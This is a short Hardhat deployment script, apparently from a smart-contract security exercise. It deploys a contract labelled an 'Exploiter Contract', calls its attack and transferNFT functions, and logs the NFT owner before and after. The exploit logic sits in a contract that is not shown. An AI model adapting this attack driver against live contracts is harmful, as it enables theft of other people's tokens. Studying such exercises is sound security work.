const hre = require("hardhat");

async function main() {
  const Luck = await hre.ethers.getContractFactory("Luck");
  const luck = await Luck.deploy();

  await luck.deployed();

  console.log("🧛 Exploiter Contract deployed to:", luck.address);

  const before = await luck.ownership();
  console.log("🥷  The holder of the NFT before the attack:", before.toString());

  await luck.attack();
  await luck.transferNFT();

  const after = await luck.ownership();
  console.log("🧛 The holder of the NFT after the attack:", after.toString());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
